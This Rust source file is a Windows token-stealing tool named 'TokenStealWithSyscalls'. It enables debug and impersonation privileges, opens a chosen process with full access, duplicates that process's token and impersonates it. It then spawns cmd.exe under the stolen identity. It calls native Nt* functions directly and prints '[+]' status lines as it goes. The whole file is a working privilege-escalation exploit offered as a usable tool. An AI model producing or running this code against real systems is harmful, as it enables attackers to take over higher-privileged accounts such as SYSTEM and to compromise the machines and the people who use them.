extern crate ntapi;
extern crate winapi;

use ntapi::ntapi_base::CLIENT_ID;

use ntapi::ntpsapi::NtOpenProcess;
use ntapi::ntpsapi::NtSetInformationThread;
use ntapi::ntpsapi::ThreadImpersonationToken;
use ntapi::ntpsapi::ZwCurrentThread;
use ntapi::ntseapi::NtAdjustPrivilegesToken;
use ntapi::ntseapi::NtDuplicateToken;
use ntapi::ntseapi::NtOpenProcessToken;
use std::env;
use std::ffi::OsStr;
use std::iter::once;
use std::mem::{size_of};
use std::os::windows::ffi::OsStrExt;

use std::ptr::null_mut;
use winapi::ctypes::c_void;

use winapi::shared::minwindef::DWORD;
use winapi::shared::minwindef::FALSE;
use winapi::shared::minwindef::TRUE;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;

use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::processthreadsapi::GetCurrentThread;
use winapi::um::processthreadsapi::{CreateProcessAsUserW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::LUID_AND_ATTRIBUTES;
use winapi::um::winnt::SECURITY_DYNAMIC_TRACKING;
use winapi::um::winnt::{
    SecurityImpersonation, TokenImpersonation, HANDLE, LUID, MAXIMUM_ALLOWED, PROCESS_ALL_ACCESS,
    SECURITY_QUALITY_OF_SERVICE, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_DUPLICATE,
    TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
};

fn child_cmd(duplicated_token_handle: HANDLE) {
    let cmd_line_str = "\"C:\\Windows\\system32\\cmd.exe\"";
    let wide_cmd_line: Vec<u16> = OsStr::new(cmd_line_str)
        .encode_wide()
        .chain(once(0))
        .collect();
    let lp_cmd_line = wide_cmd_line.as_ptr();

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    si.lpDesktop = "Winsta0\\Default\0"
        .encode_utf16()
        .chain(once(0))
        .collect::<Vec<u16>>()
        .as_ptr() as *mut _;
    si.wShowWindow = TRUE as u16;

    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let success = unsafe {
        CreateProcessAsUserW(
            duplicated_token_handle,
            null_mut(),
            lp_cmd_line as *mut _,
            null_mut(),
            null_mut(),
            FALSE,
            0,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) != 0
    };

    if !success {
        // Handle the error, possibly using GetLastError
    } else {
        unsafe {
            WaitForSingleObject(pi.hProcess, INFINITE);
            winapi::um::handleapi::CloseHandle(pi.hProcess);
            winapi::um::handleapi::CloseHandle(pi.hThread);
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        println!("Usage: TokenStealWithSyscalls PID");
        return;
    }

    let pid: u64 = args[1].parse().expect("PID should be a number.");

    println!("[+]Stealing token from process #{}.", pid);

    let current_process_handle: HANDLE = unsafe { GetCurrentProcess() };
    let mut current_token_handle: HANDLE = unsafe { GetCurrentThread() };

    let result = unsafe {
        NtOpenProcessToken(
            current_process_handle,
            TOKEN_ADJUST_PRIVILEGES,
            &mut current_token_handle,
        )
    };
    println!("[+]NtOpenProcessToken result: {:#02X}", result);

    let mut tp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: LUID {
                LowPart: 20,
                HighPart: 0,
            },
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    // Call NtAdjustPrivilegesToken to enable SeDebugPrivilege
    let result = unsafe {
        NtAdjustPrivilegesToken(
            current_token_handle,
            FALSE as u8,
            &mut tp,
            size_of::<TOKEN_PRIVILEGES>() as u32,
            null_mut(),
            null_mut(),
        )
    };

    println!("[+]NtAdjustPrivilegesToken result: {:#02X}", result);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Luid.LowPart = 29;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Call NtAdjustPrivilegesToken to enable SeImpersonatePrivilege
    let result = unsafe {
        NtAdjustPrivilegesToken(
            current_token_handle,
            FALSE as u8,
            &mut tp,
            size_of::<TOKEN_PRIVILEGES>() as u32,
            null_mut(),
            null_mut(),
        )
    };

    println!("[+]NtAdjustPrivilegesToken result: {:#02X}", result);

    let dw_desired_access: DWORD = PROCESS_ALL_ACCESS;
    let mut obja: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: null_mut(),
        ObjectName: null_mut(),
        Attributes: 0x00000040,
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
    };
    let mut client_id: CLIENT_ID = CLIENT_ID {
        UniqueProcess: pid as *mut c_void,
        UniqueThread: 0 as *mut c_void,
    };

    // Call NtOpenProcess to open the target process
    let mut target_process_handle: HANDLE = null_mut();
    let result = unsafe {
        NtOpenProcess(
            &mut target_process_handle,
            dw_desired_access,
            &mut obja,
            &mut client_id,
        )
    };

    println!("[+]NtOpenProcess result: {:#02X}", result);

    let mut target_token_handle: HANDLE = null_mut();
    let result = unsafe {
        NtOpenProcessToken(
            target_process_handle,
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
            &mut target_token_handle,
        )
    };

    println!("[+]NtOpenProcessToken result: {:#02X}", result);

    let mut duplicated_token_handle: HANDLE = null_mut();
    let mut obja2: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: null_mut(),
        ObjectName: null_mut(),
        Attributes: 0x00000040,
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
    };
    let security_quality_of_service = SECURITY_QUALITY_OF_SERVICE {
        Length: size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32,
        ImpersonationLevel: SecurityImpersonation,
        ContextTrackingMode: SECURITY_DYNAMIC_TRACKING,
        EffectiveOnly: FALSE as u8,
    };

    obja2.SecurityQualityOfService = &security_quality_of_service as *const _ as *mut _;
    // Call NtDuplicateToken to duplicate the target token
    let result = unsafe {
        NtDuplicateToken(
            target_token_handle,
            MAXIMUM_ALLOWED,
            &mut obja2,
            FALSE as u8,
            TokenImpersonation,
            &mut duplicated_token_handle,
        )
    };

    println!("[+]NtDuplicateToken result: {:#02X}", result);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Luid.LowPart = 3;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Call NtAdjustPrivilegesToken to enable SeAssignPrimaryPrivilege
    let result = unsafe {
        NtAdjustPrivilegesToken(
            duplicated_token_handle,
            FALSE as u8,
            &mut tp,
            size_of::<TOKEN_PRIVILEGES>() as u32,
            null_mut(),
            null_mut(),
        )
    };

    println!("[+]NtAdjustPrivilegesToken result: {:#02X}", result);

    // Call NtSetInformationThread to set the impersonation token
    let result = unsafe {
        NtSetInformationThread(
            ZwCurrentThread,
            ThreadImpersonationToken,
            &mut duplicated_token_handle as *mut _ as *mut c_void,
            size_of::<HANDLE>() as u32,
        )
    };

    println!("[+]NtSetInformationThread result: {:#02X}", result);

    child_cmd(duplicated_token_handle);
}
